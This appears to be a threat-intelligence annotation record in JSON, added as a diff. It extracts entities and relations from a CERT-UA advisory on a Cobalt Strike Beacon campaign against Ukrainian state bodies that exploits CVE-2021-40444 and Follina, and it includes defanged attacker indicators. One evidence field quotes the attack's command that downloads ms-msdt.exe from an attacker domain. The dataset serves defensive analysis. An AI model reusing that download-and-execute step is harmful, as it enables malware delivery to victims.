@@ -1,0 +1,118 @@
+{
+  "docId": 40559,
+  "date": "02.06.2022",
+  "title": "Кібератака на державні організації України з використанням шкідливої програми Cobalt Strike Beacon та експлойтів до вразливостей CVE-2021-40444 і CVE-2022-30190 (CERT-UA#4753)",
+  "entities": [
+    {
+      "id": "40559:0",
+      "name": "України",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe.",
+      "scheme": "S2",
+      "category": "Sector",
+      "role": null
+    },
+    {
+      "id": "40559:1",
+      "name": "зміни оплата праці з нарахуваннями.docx",
+      "kind": "malicious file",
+      "gloss": "A malicious DOCX document distributed via email targeting Ukrainian state organizations.",
+      "scheme": "S6",
+      "category": null,
+      "role": "attacker"
+    },
+    {
+      "id": "40559:2",
+      "name": "Good thing we disabled macros.html",
+      "kind": "malicious file",
+      "gloss": "An external HTML file containing malicious JavaScript code executed during the attack.",
+      "scheme": "S6",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "40559:3",
+      "name": "CVE-2021-40444",
+      "kind": "vulnerability",
+      "gloss": "A remote code execution vulnerability in Microsoft MSHTML.",
+      "scheme": null,
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "40559:4",
+      "name": "CVE-2022-30190",
+      "kind": "vulnerability",
+      "gloss": "A remote code execution vulnerability in the Microsoft Support Diagnostic Tool, also known as Follina.",
+      "scheme": null,
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "40559:5",
+      "name": "ms-msdt.exe",
+      "kind": "malicious file",
+      "gloss": "A malicious executable file downloaded and executed to deploy Cobalt Strike Beacon.",
+      "scheme": "S6",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "40559:6",
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A post-exploitation agent and component of the Cobalt Strike adversary simulation software.",
+      "scheme": "S6",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "40559:7",
+      "name": "nod-update[.]it",
+      "kind": "domain name",
+      "gloss": "A domain name used as malicious infrastructure to host and distribute malware.",
+      "scheme": "S4",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "40559:8",
+      "name": "185[.]64.106.39",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command and control or hosting infrastructure.",
+      "scheme": "S5",
+      "category": null,
+      "role": null
+    }
+  ],
+  "relations": [
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits",
+      "tail": "CVE-2021-40444",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "зміни оплата праці з нарахуваннями.docx",
+      "type": "exploits",
+      "tail": "CVE-2022-30190",
+      "evidence": "після експлуатації вразливостей CVE-2021-40444 та CVE-2022-30190"
+    },
+    {
+      "head": "nod-update[.]it",
+      "type": "hosts",
+      "tail": "ms-msdt.exe",
+      "evidence": "DownloadFile('hXXps://nod-update[.]it/ms-msdt.exe','C:\\Users\\Public\\ms-msdt.exe')"
+    },
+    {
+      "head": "ms-msdt.exe",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "завантаження EXE-файлу \"ms-msdt.exe\" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon"
+    }
+  ],
+  "unclassified": [
+    "40559:3",
+    "40559:4"
+  ]
+}
